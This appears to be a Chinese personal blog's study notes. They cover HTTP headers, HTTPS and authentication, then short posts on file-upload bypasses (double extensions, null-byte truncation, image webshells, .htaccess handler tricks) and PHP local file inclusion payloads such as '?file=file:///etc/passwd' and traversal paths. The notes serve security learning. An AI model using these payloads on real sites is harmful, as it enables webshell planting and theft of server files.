+<h2 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h2><h3 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h3><p>通知服务器，用户代理能够处理的媒体类型及媒体类型的优先级。<br><code>资源类型/资源格式 q=</code><br>权重值q的范围是0~1。当服务器提供多种内容时，将会优先返回权重值最高的媒体类型。</p>
+<h3 id="Accept-Charset"><a href="#Accept-Charset" class="headerlink" title="Accept-Charset"></a>Accept-Charset</h3><p>通知服务器用户代理支持的字符集及字符集的相对优先顺序。该首部字段应用于内容协商机制的服务器驱动协商。</p>
+<h3 id="Accept-Encoding"><a href="#Accept-Encoding" class="headerlink" title="Accept-Encoding"></a>Accept-Encoding</h3><p>告知服务器用户代理支持的内容编码及内容编码的优先级顺序。</p>
+<h3 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h3><p>告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级。</p>
+<h3 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h3><p>告知服务器用户代理的认证信息。</p>
+<h3 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h3><p>告知服务器请求的资源所处的互联网主机名和端口号。Host首部字段在HTTP/1.1规范内是唯一一个必须被包含在请求内的首部字段。</p>
+<h3 id="If-Match"><a href="#If-Match" class="headerlink" title="If-Match"></a>If-Match</h3><p>形如If-xxx这种样式的请求字段首部，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。<br>服务器会比对If-Match的字段值和资源的ETag值，仅当两者一致时，才会执行请求，反之，则返回状态码412 Precondition Failed的响应。</p>
+<h3 id="If-Modified-Since"><a href="#If-Modified-Since" class="headerlink" title="If-Modified-Since"></a>If-Modified-Since</h3><p>告知服务器若If-Modified-Since字段值早于资源的更新时间，则希望能处理该请求。若请求的资源都没有更新过，则返回状态码304 Not Modified的响应。</p>
+<h3 id="If-None-Match"><a href="#If-None-Match" class="headerlink" title="If-None-Match"></a>If-None-Match</h3><p>和首部字段If-Match作用相反。用于指定If-None-Match字段值的实体标记（ETag）值与请求资源的ETag不一致时，它就告知服务器处理该请求。</p>
+<h3 id="If-Range"><a href="#If-Range" class="headerlink" title="If-Range"></a>If-Range</h3><p>告知服务器若指定的If-Range字段值（ETag值或者时间）和请求资源的ETag值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。</p>
+<h3 id="If-Unmodified-Since"><a href="#If-Unmodified-Since" class="headerlink" title="If-Unmodified-Since"></a>If-Unmodified-Since</h3><p>与If-Modified-Since作用相反。告知服务器指定的请求资源只有在字段值内指定的日期时间之后未发生更新的情况下，才能处理请求。</p>
+<h3 id="Max-Forwards"><a href="#Max-Forwards" class="headerlink" title="Max-Forwards"></a>Max-Forwards</h3><p>通过TRACE方法或OPTIONS方法，发送包含首部字段Max-Forwards的请求时，该字段以十进制整数形式指定可经过的服务器最大数目。</p>
+<h3 id="Proxy-Authorization"><a href="#Proxy-Authorization" class="headerlink" title="Proxy-Authorization"></a>Proxy-Authorization</h3><p>接收到从代理服务器发来的认证质询时，客户端会发送包含首部字段Proxy-Authorization的请求，以告知服务器认证所需要的信息。这个行为是与客户端和服务器之间的HTTP访问认证相类似的，不同之处在于，认证行为发生在客户端与代理之间。</p>
+<h3 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h3><p>对于只需获取部分资源的范围请求，包含首部字段Range即可告知服务器资源的指定范围。</p>
+<h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p>首部字段Referer会告知服务器请求的原始资源的URI。</p>
+<h3 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h3><p>将创建请求的浏览器和用户代理名称等信息传达给服务器。</p>
+<h2 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h2><h3 id="Accept-Ranges"><a href="#Accept-Ranges" class="headerlink" title="Accept-Ranges"></a>Accept-Ranges</h3><p>告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。可指定的字段值有两种，可处理范围请求时指定其未bytes，反之则指定其为none。</p>
+<h3 id="Age"><a href="#Age" class="headerlink" title="Age"></a>Age</h3><p>告知客户端，源服务器在多久前创建了响应。若创建该响应的是缓存服务器，Age值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应式必须加上首部字段Age。</p>
+<h3 id="ETag"><a href="#ETag" class="headerlink" title="ETag"></a>ETag</h3><p>告知客户端实体标识。它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的ETag值。另外，当资源更新时，ETag值也需要更新。若在下载过程中出现连接中断、再连接的情况，都会依照ETag值来指定资源。</p>
+<ul>
+<li>强ETag值<br>不论实体发生多么细微的变化都会改变其值。</li>
+<li>弱ETag值<br>弱ETag值只用于提示资源是否相同。只有资源发生了根本改变，产生差异时才会改变ETag值。这时，会在字段值最开始处附加W/。</li>
+</ul>
+<h3 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h3><p>使用首部字段Location可以将响应接收方引导至某个与请求URI位置不同的资源。基本上，该字段会配合3XX：Redirection的响应，提供重定向的URI。</p>
+<h3 id="Proxy-Authenticate"><a href="#Proxy-Authenticate" class="headerlink" title="Proxy-Authenticate"></a>Proxy-Authenticate</h3><p>会把由代理服务器所要求的认证信息发送给客户端。</p>
+<h3 id="Retry-After"><a href="#Retry-After" class="headerlink" title="Retry-After"></a>Retry-After</h3><p>告知客户端应该再多久之后再次发送请求。字段值可以指定为具体的日期时间，也可以是创建响应后的秒数。</p>
+<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>告知客户端当前服务器上安装的HTTP服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。</p>
+<h3 id="WWW-Authenticate"><a href="#WWW-Authenticate" class="headerlink" title="WWW-Authenticate"></a>WWW-Authenticate</h3><p>用于HTTP访问认证。它会告知客户端适用于访问请求URI所指定资源的认证方案（Basic或是Digest）和带参数提示的质询（challenge）。</p>
+<h2 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h2><h3 id="Allow"><a href="#Allow" class="headerlink" title="Allow"></a>Allow</h3><p>通知客户端能够支持Request-URI指定资源的所有HTTP方法。当服务器接收到不支持的HTTP方法时，会以状态码405 Method Not Allowed作为响应返回。与此同时，还会把所有能支持的HTTP方法写入首部字段Allow后返回。</p>
+<h3 id="Content-Encoding"><a href="#Content-Encoding" class="headerlink" title="Content-Encoding"></a>Content-Encoding</h3><p>告知客户端服务器对实体的主体部分选用的内容编码方式。</p>
+<h3 id="Content-Language"><a href="#Content-Language" class="headerlink" title="Content-Language"></a>Content-Language</h3><p>告知客户端，实体主体使用的自然语言。</p>
+<h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h3><p>表明了实体主体部分的大小（单位是字节）。对实体主体进行内容编码传输时，不能再使用Content-Length首部字段。</p>
+<h3 id="Content-Location"><a href="#Content-Location" class="headerlink" title="Content-Location"></a>Content-Location</h3><p>给出与报文主体部分相对应的URI</p>
+<h3 id="Connect-MD5"><a href="#Connect-MD5" class="headerlink" title="Connect-MD5"></a>Connect-MD5</h3><p>是一串由MD5算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。对报文主体执行MD5算法获得的128位二进制数，再通过base64编码后将结果写入Content-MD5字段值。由于HTTP首部无法记录二进制值，所以要通过Base64编码处理。为确保报文的有效性，作为接收方的客户端会对报文主体再执行一次相同的MD5算法。计算出的值与字段值作比较后，即可判断出报文主体的准确性。</p>
+<h3 id="Content-Range"><a href="#Content-Range" class="headerlink" title="Content-Range"></a>Content-Range</h3><p>针对范围请求，返回响应式使用的首部字段Content-Range，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小。</p>
+<h3 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h3><p><code>Content-Type: text/html; charset=UTF-8</code><br>首部字段Content-Type说明了实体主体内对象的媒体类型。和首部字段Accept一样，字段值用type/subtype形式赋值。参数charset使用字符集进行赋值。</p>
+<h3 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h3><p>会将资源失效的日期告知客户端。缓存服务器再接收到含有首部字段Expires的响应后，会以缓存来应答请求，在Expires字段指定的时间之前，响应的副本会一直被保存。</p>
+<h3 id="Last-Modified"><a href="#Last-Modified" class="headerlink" title="Last-Modified"></a>Last-Modified</h3><p>指明资源最终修改的时间</p>
+<h2 id="为Cookie服务的首部字段"><a href="#为Cookie服务的首部字段" class="headerlink" title="为Cookie服务的首部字段"></a>为Cookie服务的首部字段</h2><h3 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h3><table>
+<thead>
+<tr>
+<th>属性</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NAME=VALUE</td>
+<td>赋予Cookie的名称和值（必须项）</td>
+</tr>
+<tr>
+<td>expires=DATE</td>
+<td>Cookie的有效期（若不明确指定则默认为浏览器关闭前为止）</td>
+</tr>
+<tr>
+<td>path=PATH</td>
+<td>将服务器上的文件目录作为Cookie的适用对象（若不指定则默认文文档所在的文件目录）</td>
+</tr>
+<tr>
+<td>domain=域名</td>
+<td>作为Cookie适用对象的域名（若不指定则默认为创建Cookie的服务器的域名）</td>
+</tr>
+<tr>
+<td>Secure</td>
+<td>仅在HTTPS安全通信时才会发送Cookie</td>
+</tr>
+<tr>
+<td>HttpOnly</td>
+<td>加以限制，使Cookie不能被JavaScript脚本访问</td>
+</tr>
+</tbody></table>
+<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p><code>Cookie: status=enable</code><br>告知服务器，当客户端想获得HTTP状态管理支持时，就会在请求中包含从服务器接收到的Cookie。</p>
+<h2 id="其他首部字段"><a href="#其他首部字段" class="headerlink" title="其他首部字段"></a>其他首部字段</h2><h3 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h3><p>属于HTTP响应首部，用于控制网站内容在其他Web网站的Frame标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击。</p>
+<ul>
+<li>DENY：拒绝</li>
+<li>SAMEORIGIN：仅同源域名下的页面匹配时许可。</li>
+</ul>
+<h3 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h3><p>属于HTTP响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器XSS防护机制的开关。</p>
+<ul>
+<li>0：将XSS过滤设置成无效状态</li>
+<li>1：将XSS过滤设置成有效状态</li>
+</ul>
+<h3 id="DNT"><a href="#DNT" class="headerlink" title="DNT"></a>DNT</h3><p>属于HTTP请求首部，是Do Not Track的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。</p>
+<ul>
+<li>0：同意被追踪</li>
+<li>1：拒绝被追踪</li>
+</ul>
+<h1 id="确保Web安全的HTTPS"><a href="#确保Web安全的HTTPS" class="headerlink" title="确保Web安全的HTTPS"></a>确保Web安全的HTTPS</h1><h2 id="HTTP的缺点"><a href="#HTTP的缺点" class="headerlink" title="HTTP的缺点"></a>HTTP的缺点</h2><ul>
+<li>通信使用明文（不加密），内容可能会被窃听</li>
+<li>不验证通信方的身份，因此有可能遭遇伪装</li>
+<li>无法证明报文的完整性，所以有可能已遭篡改</li>
+</ul>
+<h3 id="加密处理防止被窃听"><a href="#加密处理防止被窃听" class="headerlink" title="加密处理防止被窃听"></a>加密处理防止被窃听</h3><blockquote>
+<p>通信的加密<br>HTTP协议中没有加密机制，但可以通过和SSL或TLS的组合使用，加密HTTP的通信内容。用SSL建立安全通信线路之后，就可以在这条线路上进行HTTP通信了。与SSL组合使用的HTTP被称为HTTPS（HTTP Secure，超文本传输安全协议）或HTTP over SSL。</p>
+</blockquote>
+<blockquote>
+<p>内容的加密<br>由于HTTP协议中没有加密机制，那么就对HTTP协议传输的内容本身加密。即把HTTP报文里所含的内容进行加密处理。</p>
+</blockquote>
+<h3 id="不验证通信方的身份就可能遭遇伪装"><a href="#不验证通信方的身份就可能遭遇伪装" class="headerlink" title="不验证通信方的身份就可能遭遇伪装"></a>不验证通信方的身份就可能遭遇伪装</h3><blockquote>
+<p>查明对手的的证书<br>SSL不仅提供加密处理，而且还使用了一种被称为证书的手段，可用于确定方。</p>
+</blockquote>
+<blockquote>
+<p>如何防止篡改<br>常用的是MD5和SHA-1等散列值校验的方法，以及用来确认文件的数字签名方法。</p>
+</blockquote>
+<h2 id="HTTP-加密-认证-完整性保护-HTTPS"><a href="#HTTP-加密-认证-完整性保护-HTTPS" class="headerlink" title="HTTP+加密+认证+完整性保护=HTTPS"></a><em><strong>HTTP+加密+认证+完整性保护=HTTPS</strong></em></h2><p>加密和解密同用一个密钥的方式称为共享密钥加密，也被叫做对称密钥加密。<br>公开密钥加密使用一堆非对称的密钥。一把叫做私有密钥，另一把叫做公开密钥。发送密文的乙方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密。   </p>
+<h3 id="HTTP采用混合加密机制"><a href="#HTTP采用混合加密机制" class="headerlink" title="HTTP采用混合加密机制"></a><strong>HTTP采用混合加密机制</strong></h3><p>在交换密钥阶段使用公开密钥加密方式，之后的建立通信交换报文阶段则使用共享密钥加密方式。</p>
+<h3 id="证明公开密钥正确性的证书"><a href="#证明公开密钥正确性的证书" class="headerlink" title="证明公开密钥正确性的证书"></a>证明公开密钥正确性的证书</h3><p>数字证书认证机构处于客户端和服务器双方都可信赖的第三方机构的立场上。<br>首先，服务器的运营运营人员向数字证书认证机构提出公开密钥的申请。数字认证机构在判明申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起。服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端。以进行公开密钥加密方式通信。接到证书的客户端可使用数字证书认证机构的公开密钥，对那张证书上的数字签名进行验证。<br>此处认证机关的公开密钥必须安全地交给客户端。因此，多数浏览器开发商发布版本时，会事先在内部植入常用认证机关的公开密钥。</p>
+<h3 id="可证明组织真实性的EV-SSL证书"><a href="#可证明组织真实性的EV-SSL证书" class="headerlink" title="可证明组织真实性的EV SSL证书"></a>可证明组织真实性的EV SSL证书</h3><p>EV SSL证书时基于国际标准的认证指导方针办法的证书。其严格规定了对运营组织是否真实的确认方针，因此，通过认证的Web网站能够获得更高的认可度。</p>
+<h3 id="用以确认客户端的客户端证书"><a href="#用以确认客户端的客户端证书" class="headerlink" title="用以确认客户端的客户端证书"></a>用以确认客户端的客户端证书</h3><p>以客户端证书进行客户端认证，证明服务器正在通信的对方始终时预料之内的客户端，其作用跟服务器证书如出一辙。<br>客户端证书存在的另一个问题点是，客户端证书毕竟只能用来证明客户端实际存在，而不能用来证明用户本人的真实有效性。也就是说，只要获得了安装有客户端证书的计算机的使用权限，也就意味着同时拥有了客户端证书的使用权限。</p>
+<h3 id="认证机构信誉第一"><a href="#认证机构信誉第一" class="headerlink" title="认证机构信誉第一"></a>认证机构信誉第一</h3><p>SSL机制中接入认证机构之所以可行，是因为建立在其信用绝对可靠这一大前提下的。</p>
+<p>由自认证机构颁发的证书称为自签名证书</p>
+<h3 id="HTTPS的安全通信机制"><a href="#HTTPS的安全通信机制" class="headerlink" title="HTTPS的安全通信机制"></a>HTTPS的安全通信机制</h3><p>步骤1：客户端通过发送Client Hello报文开始SSL通信。报文中包含客户端支持的SSL的指定版本、加密组件（cipher）列表（所使用的加密算法及密钥长度等）。<br>步骤2：服务器可进行SSL通信时，会以Server Hello报文作为应答。和客户端一样，在报文中包含SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。<br>步骤3：之后服务器发送Certificate报文。报文中包含公开密钥证书。<br>步骤4：最后服务器发送Server Hello Done报文通知客户端，最初阶段的SSL握手协商部分结束。<br>步骤5：SSL第一次握手结束之后，客户端以Client Key Exchange报文作为回应。报文中包含通信加密中使用的一种被称为Pre-master secret的随机密码串。该报文已用步骤3中的公开密钥进行加密。<br>步骤6：接着客户端继续发送Change Cipher Spec报文。该报文会提示服务器，在此报文之后的通信会采用Pre-master secret密钥加密。<br>步骤7：客户端发送Finished报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。<br>步骤8：服务器同样发送Change Cipher Spec报文<br>步骤9： 服务器同样发送Finished报文。<br>步骤10：服务器和客户端的Finished报文交换完毕之后，SSL连接就算建立完成。从此处开始进行应用层协议的通信，即发送HTTP请求。<br>步骤11：应用层协议通信，即发送HTTP响应。<br>步骤12：最后由客户端断开连接。断开连接时，发送close_notify报文。这步之后再发送TCP FIN报文来关闭与TCP的通信。</p>
+<h1 id="确认访问用户身份的认证"><a href="#确认访问用户身份的认证" class="headerlink" title="确认访问用户身份的认证"></a>确认访问用户身份的认证</h1><h2 id="BASIC认证"><a href="#BASIC认证" class="headerlink" title="BASIC认证"></a>BASIC认证</h2><p>步骤1：当请求的资源需要BASIC认证时，服务器会随状态码401 Authorization Required，返回带WWW-Authenticate首部字段的响应。该字段内包含认证的方式（BASIC）及Request-URI安全域字符串（realm）。<br>步骤2： 接收到状态码401的客户端为了通过BASIC认证，需要将用户ID及密码发送给服务器。发送的字符串内容是由用户ID和密码构成，两者中间以冒号（：）连接后，再经过Base64编码处理。把这串字符串写入首部字段Authorization后，发送请求。<br>步骤3：接收到包含首部字段Authorization请求的服务器，会对认证信息的正确性进行验证。如验证通过，则会返回一条包含Request-URI资源的响应。</p>
+<p>BASIC认证使用上不够便捷灵活，且达不到多数Web网站期望的安全性等级，因此它并不常用。</p>
+<h2 id="DIGEST认证"><a href="#DIGEST认证" class="headerlink" title="DIGEST认证"></a>DIGEST认证</h2><p>步骤1：请求需认证的资源时，服务器会随着状态码401 Authorization Required，返回带WWW-Authenticate首部字段的响应。该字段内包含指纹响应方式认证所需的临时质询码（随机数，nonce）。<br>步骤2：接收到401状态码的客户端，返回的响应中包含DIGEST认证必须的首部字段Authorization信息，其中必须包含username、realm、nonce、uri和response的字段信息。其中，realm和nonce就是之前从服务器接收到的响应中的字段。response也可叫做Request-Digest，存放经过MD5运算后的密码字符串，形成响应码。<br>步骤3：接收到包含首部字段Authorization请求的服务器，会确认认证信息的正确性。认证通过后则返回包含Request-URI资源的响应。并且这时会在首部字段Authentication-Info写入一些认证成功的相关信息。</p>
+<h2 id="SSL客户端认证"><a href="#SSL客户端认证" class="headerlink" title="SSL客户端认证"></a>SSL客户端认证</h2><p>为达到SSL客户端认证的目的，需要实现将客户端证书分发给哭护短，且客户端必须安装此证书。<br>步骤1：接收到需要认证资源的请求，服务器会发送Certificate Request报文，要求客户端提供客户端证书。<br>步骤2：用户选择将发送的客户端证书后，客户端会把客户端证书信息以Client Certificate报文方式发送给服务器。<br>步骤3：服务器验证客户端证书，验证通过后方可领取证书内客户端的公开密钥，然后开始HTTPS加密通信。</p>
+<h2 id="表单认证"><a href="#表单认证" class="headerlink" title="表单认证"></a>表单认证</h2><p>客户端会向服务器上的Web应用程序发送登录信息（Credential），按登录信息的验证结果认证。基于表单认证的标准规范尚未有定论，一般会使用Cookie来管理Session（会话）。<br>步骤1：客户端把用户ID和密码等登录信息放入报文的实体部分，通常是以POST方法把请求发送给服务器。而这时，会使用HTTPS通信来进行HTML表单画面的显示和用户输入数据的发送。<br>步骤2：服务器会发放用以识别用户的Session ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态域Session ID绑定后记录在服务器端。<br>步骤3：客户端接收到从服务器端发来的Session ID后，会将其作为Cookie保存在本地。下次向服务器发送请求时，浏览器会自动发送Cookie，所以Session ID也随之发送到服务器。服务器端可通过验证接收到的Session ID识别用户和其认证状态。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2023/01/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="竹云">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome To QYZY's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/01/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">文件上传</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-01-14 23:18:34 / 修改时间：23:19:05" itemprop="dateCreated datePublished" datetime="2023-01-14T23:18:34+08:00">2023-01-14</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="前端校验文件"><a href="#前端校验文件" class="headerlink" title="前端校验文件"></a>前端校验文件</h2><p>通过浏览器禁用JS、burpsuite改包中的文件扩展名等绕过，比较容易。</p>
+<h2 id="服务器端文件类型验证"><a href="#服务器端文件类型验证" class="headerlink" title="服务器端文件类型验证"></a>服务器端文件类型验证</h2><p>同样使用burpsuite改包中<code>Content-Type</code>类型即可绕过。</p>
+<h2 id="服务器端扩展名验证"><a href="#服务器端扩展名验证" class="headerlink" title="服务器端扩展名验证"></a>服务器端扩展名验证</h2><p>将木马<code>a.php</code>改为<code>a.php.abc</code>。上传验证时只会验证<code>.abc</code>,因此可以通过验证。而Apache在解析文件的时候，如果解析不了<code>.abc</code>扩展名，会向前寻找可解析的扩展名，即<code>.php</code>。就可以连接蚁剑。</p>
+<h2 id="00截断上传"><a href="#00截断上传" class="headerlink" title="00截断上传"></a>00截断上传</h2><p>通过抓包将文件上传路径<code>/upload/a.php.jpg</code>中的<code>.</code>换成<code>0x00</code>。即可让服务器认为文件已结束，保存为<code>a.php</code>文件。</p>
+<h2 id="图片马绕过"><a href="#图片马绕过" class="headerlink" title="图片马绕过"></a>图片马绕过</h2><p>输入<code>copy 1.jpg/b+a.php/a b.jpg</code>将a.php插入到1.jpg中形成图片马。/b是二进制打开，/a是ascii方式打开。<br>将图片马上传后，利用文件包含漏洞将该图片作为php文件解析，或者同时上传<code>.htaccess</code>文件<br><code>SetHandler application/x-httpd-php</code>将图片马作为php文件解析。  </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2023/01/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="竹云">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome To QYZY's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/01/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">文件包含</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-01-14 23:16:32 / 修改时间：23:17:39" itemprop="dateCreated datePublished" datetime="2023-01-14T23:16:32+08:00">2023-01-14</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="1-与文件包含相关的函数"><a href="#1-与文件包含相关的函数" class="headerlink" title="1.与文件包含相关的函数"></a>1.与文件包含相关的函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require      找不到被包含的文件时会产生指明错误，并停止脚本运行。</span><br><span class="line">include      找不到被包含文件时只会产生警告，脚本将继续运行。</span><br><span class="line">include_once 与include类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">require_once 与require类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-本地文件包含-LFI–Local-File-Include"><a href="#2-本地文件包含-LFI–Local-File-Include" class="headerlink" title="2.本地文件包含(LFI–Local File Include)"></a>2.本地文件包含(LFI–Local File Include)</h1><p>只要网站支持上传，上传任意后缀文件，被包含的文件中含有效的PHP代码，则引入当前文件执行，若不含有效PHP代码，则直接输出文件内容</p>
+<ul>
+<li>样例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php phpinfo();?&gt;&quot;info.txt</span><br><span class="line"></span><br><span class="line"># lfi.php</span><br><span class="line">&lt;?php include($_GET[&#x27;file&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line"># </span><br><span class="line">http://ip/?file=info.txt</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>附加条件</th>
+<th>样例(file=)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>zip://</td>
+<td>ZIP extension</td>
+<td>zip://archive.zip#dir/file.txt</td>
+</tr>
+<tr>
+<td>phar://</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>file</td>
+<td></td>
+<td>file:///etc/passwd</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h2 id="2-1-zip"><a href="#2-1-zip" class="headerlink" title="2.1 zip://"></a>2.1 zip://</h2><blockquote>
+<p>zip extension</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># zip 内含目录</span><br><span class="line">zip://archive.zip#dir/file.txt</span><br><span class="line"></span><br><span class="line"># url 中使用 &quot;%23&quot;(#)</span><br><span class="line">?f=zip://path_to_zip%23inside_file_name</span><br></pre></td></tr></table></figure>
+<p>文件压缩成zip包，压缩的时候要注意选择only store之类的选项，防止数据被压缩</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -0 1.zip shell.php</span><br></pre></td></tr></table></figure>
+<ul>
+<li>影响函数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fopen()</span><br><span class="line">file_get_contents()</span><br><span class="line">imagecreatefromgif()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p>与zip协议区别就是phar是用/来分隔而不是#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://php.zip/php.jpg</span><br></pre></td></tr></table></figure>
+
+<h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><p>访问本地文件系统</p>
+<ul>
+<li>样例<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=file:///etc/passwd</span><br><span class="line">?file=file://c:/windows/win.ini</span><br></pre></td></tr></table></figure></li>
+<li>影响函数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="3-本地文件包含常见利用方式"><a href="#3-本地文件包含常见利用方式" class="headerlink" title="3.本地文件包含常见利用方式"></a>3.本地文件包含常见利用方式</h1><h2 id="3-1目录遍历"><a href="#3-1目录遍历" class="headerlink" title="3.1目录遍历"></a>3.1目录遍历</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># linux这两个文件存储着所有文件的路径，需要root权限</span><br><span class="line">?file=../../../../../../var/lib/mlocate/mlocate.db</span><br><span class="line">?file=../../../../../../../var/lib/locate.db</span><br></pre></td></tr></table></figure>
+
